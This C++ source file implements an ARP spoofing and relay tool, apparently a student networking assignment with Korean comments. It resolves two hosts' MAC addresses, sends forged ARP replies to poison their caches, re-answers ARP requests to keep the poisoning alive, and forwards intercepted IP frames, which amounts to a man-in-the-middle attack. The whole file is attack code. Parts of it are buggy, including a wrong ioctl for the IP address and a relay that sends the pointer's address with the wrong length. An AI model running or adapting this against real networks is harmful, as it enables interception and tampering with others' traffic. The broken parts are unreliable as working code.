#include <cstdio>
#include <pcap.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <net/if.h>
//Mac Address , IP

#include "ethhdr.h"
#include "arphdr.h"
#include <iostream>
#include <map>
#include <string>
#include <vector>

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket {
EthHdr eth_;
ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> <sender ip> <target ip>\n");
    printf("sample : send-arp wlan0 192.168.10.2  192.168.10.1  192.168.10.1  192.168.10.2\n");
}

Mac MyMacAddress(struct ifreq ifr, char *dev){
    memset(&ifr, 0x00, sizeof(ifr));
    strcpy(ifr.ifr_name, dev);
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if( sock < 0){
        perror("error_socket");
        exit(1);
    }
    if(ioctl(sock,SIOCGIFHWADDR,&ifr)<0){
        perror("error_ioctl");
        exit(1);
    }
    close(sock);

    uint8_t mac_temp[6];
    for(int i = 0; i < 6; i ++){
        mac_temp[i] = ifr.ifr_addr.sa_data[i];
    }
    Mac my_mac_add = Mac(mac_temp);
    printf("Success! Get My Mac Address! \n");
    return my_mac_add;
}

Ip MyIpAddress(struct ifreq ifr, char * dev){
    memset(&ifr, 0x00, sizeof(ifr));
    strcpy(ifr.ifr_name, dev);
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if( sock < 0){
        perror("error_socket");
        exit(1);
    }
    if(ioctl(sock,SIOCGIFHWADDR,&ifr)<0){
        perror("error_ioctl");
        exit(1);
    }
    close(sock);

    sockaddr_in *sin = (struct sockaddr_in *)&ifr.ifr_addr;
    Ip my_ip_add = Ip(inet_ntoa(sin->sin_addr));
    printf("Success! Get My IP Address! \n");
    return my_ip_add;
}

Mac UnknownMacAddress(char *name, Ip my_ipAdd, Mac my_macAdd, Ip unknown_ipAdd){
    Mac unknown_macAdd;

    char* dev = name;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF"); //broadcast
    packet.eth_.smac_ = my_macAdd; //me
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = my_macAdd; //me
    packet.arp_.sip_ = htonl(my_ipAdd); //me
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //broadcast
    packet.arp_.tip_ = htonl(unknown_ipAdd); //target

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* getpacket;
        int res = pcap_next_ex(handle, &header, &getpacket);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            exit(1);
        }

        struct EthHdr *get_eth_hdr;
        struct ArpHdr *get_arp_hdr;
        get_eth_hdr = (struct EthHdr *)getpacket;
        getpacket+= sizeof (struct EthHdr );
        get_arp_hdr = (struct ArpHdr *)getpacket;


        //해당 패킷에서 arp 인지, reply인지, IP가 맞는지 세번 확인한다.
        if(ntohs(get_eth_hdr->type_) == 0x0806 //ARP
                &&ntohs(get_arp_hdr->op_) == ArpHdr::Reply  //Reply
                && ntohl(get_arp_hdr->sip_)==unknown_ipAdd){  //IP
            unknown_macAdd = get_arp_hdr->smac_;
            return unknown_macAdd;
        }


    }
}

void SenderTargetModulation(char* name, char* sender, char* target, map<Ip,Mac> arp){
    char* dev = name;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    Ip sender_IP_Add = Ip (sender);
    Ip target_IP_Add = Ip (target);
    Mac sender_Mac_Add;
    Mac target_Mac_Add;

    EthArpPacket packet;
    struct ifreq ifr_mac;
    Mac my_Mac_Add = MyMacAddress(ifr_mac, dev);
   
    //해당 ip에 맞는 mac을 arp_table에서 불러온다.
    map<Ip, Mac>::iterator iter;
    for (iter = arp.begin(); iter != arp.end(); ++iter){
            if(iter->first == sender_IP_Add)
                sender_Mac_Add = iter->second;
            if(iter->first == target_IP_Add)
                target_Mac_Add = iter->second;
    }

    //패킷을 조작한다.
    packet.eth_.dmac_ = sender_Mac_Add; //you
    packet.eth_.smac_ = my_Mac_Add; //me
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = my_Mac_Add;
    packet.arp_.sip_ = htonl(Ip(target_IP_Add)); //gw
    packet.arp_.tmac_ = sender_Mac_Add; //you
    packet.arp_.tip_ = htonl(Ip(sender_IP_Add)); //you

    //조작한 패킷을 보낸다.
    //u_char *buf : 보내어진 패킷의 데이터 , int size : 버퍼 크기
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

    if (res != 0) {
    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    //패킷을 보내는데에 성공했다.
    printf("Sender %s target %s ARP Reply Sending !! Modulation Success !! \n", sender, target);
    pcap_close(handle);
}


void GetSpoofedPacket(char* dev, Ip my_IP_Add, Mac my_Mac_Add, map<Ip,Mac> arp_table){
    map<Ip, Mac>::iterator iter;
    
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* getpacket;
        int res = pcap_next_ex(handle, &header, &getpacket);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            exit(1);
        }
        struct EthHdr *get_eth_hdr;
        get_eth_hdr = (struct EthHdr *)getpacket;

        if(ntohs(get_eth_hdr->type_) == 0x0806){  //ARP
            struct ArpHdr *get_arp_hdr;
            getpacket+= sizeof (struct EthHdr );
            get_arp_hdr = (struct ArpHdr *)getpacket;

            //ARP Request Unicast to me -> send reply packet 
            if(get_arp_hdr->tmac_ == my_Mac_Add){
                EthArpPacket packet;

                packet.eth_.dmac_ = get_arp_hdr->smac_; //you
                packet.eth_.smac_ = my_Mac_Add; //me
                packet.eth_.type_ = htons(EthHdr::Arp);

                packet.arp_.hrd_ = htons(ArpHdr::ETHER);
                packet.arp_.pro_ = htons(EthHdr::Ip4);
                packet.arp_.hln_ = Mac::SIZE;
                packet.arp_.pln_ = Ip::SIZE;
                packet.arp_.op_ = htons(ArpHdr::Reply);
                packet.arp_.smac_ = my_Mac_Add; //me
                packet.arp_.sip_ = htonl(my_IP_Add); //me
                packet.arp_.tmac_ = get_arp_hdr->smac_; //you
                packet.arp_.tip_ =get_arp_hdr->sip_; //me

                int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));     
                printf("ARP Request Unicast Relay! \n");          
            }

            //ARP Request Broadcast -> send reply packet like I am target 
            if(get_arp_hdr->tmac_ == Mac("00:00:00:00:00:00")){
                EthArpPacket packet;

                
                packet.eth_.smac_ = my_Mac_Add; //me
                packet.eth_.type_ = htons(EthHdr::Arp);

                packet.arp_.hrd_ = htons(ArpHdr::ETHER);
                packet.arp_.pro_ = htons(EthHdr::Ip4);
                packet.arp_.hln_ = Mac::SIZE;
                packet.arp_.pln_ = Ip::SIZE;
                packet.arp_.op_ = htons(ArpHdr::Reply);
                packet.arp_.smac_ = my_Mac_Add; //me

                Mac temp_sender_mac ;
                Ip temp_target_ip;

                for (iter = arp_table.begin(); iter != arp_table.end(); ++iter){
                    if(iter->first == get_arp_hdr->sip_)
                        temp_sender_mac = iter->second;
                    else{
                        temp_target_ip = iter->first;
                    }
                }
                packet.eth_.dmac_ = temp_sender_mac; //sender
                packet.arp_.sip_ = htonl(temp_target_ip); //target 
                packet.arp_.tmac_ = temp_sender_mac; //sender
                packet.arp_.tip_ = get_arp_hdr->sip_; //sender

                int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));    
                printf("ARP Request Broadcast Relay! \n");                
            }
        }

        //IP -> send relay with my mac address
        if(ntohs(get_eth_hdr->type_) == 0x0800){  //IP
                Mac temp_target_mac ;

                for (iter = arp_table.begin(); iter != arp_table.end(); ++iter){
                    if(iter->second != get_eth_hdr->smac_)
                        temp_target_mac = iter->second;
                }

            memcpy((u_char *)(getpacket), &(temp_target_mac), 6); //dmac => targetmac
            memcpy((u_char *)(getpacket + 6), &(my_Mac_Add), 6); //smac => mymacc
            

            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&getpacket), sizeof(EthArpPacket));
            printf("IP Relay! \n");    
        }

    }
}

int main(int argc, char* argv[]) {
    //argv자리에 1,2/ 2,1 이렇게 네개만 들어온다고 가정하고 코드 작성.
    if (argc != 6) {
        usage();
        return -1;
    }
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
    struct ifreq ifr_mac;
    struct ifreq ifr_ip;

    Mac my_Mac_Add = MyMacAddress(ifr_mac, dev);
    Ip my_IP_Add = MyIpAddress(ifr_ip, dev);

    //make my own ARP Table
    map<Ip, Mac> arp_table;
    map<Ip, Mac>::iterator iter;
    
    //들어온 argv[2], argv[3]에 대해서 진행한다. 2개 쌍에 대해서 mac주소를 알아냄.
    for(int i = 2; i < 4 ; i ++){
        Ip unknown_Ip_Add = Ip(argv[i]);
        Mac unknown_Mac_Add = UnknownMacAddress(dev, my_IP_Add, my_Mac_Add, unknown_Ip_Add);
        arp_table[unknown_Ip_Add]= unknown_Mac_Add;          
        }

 

    //sender-target 쌍에 대해서 Modulation을 한다.
    for(int i = 2; i <= 4; i+=2){
        SenderTargetModulation(argv[1], argv[i], argv[i+1], arp_table);
    }

    //Spoofed Packet을 가져와서 Relay를 해준다.
    GetSpoofedPacket(dev, my_IP_Add, my_Mac_Add, arp_table);

}
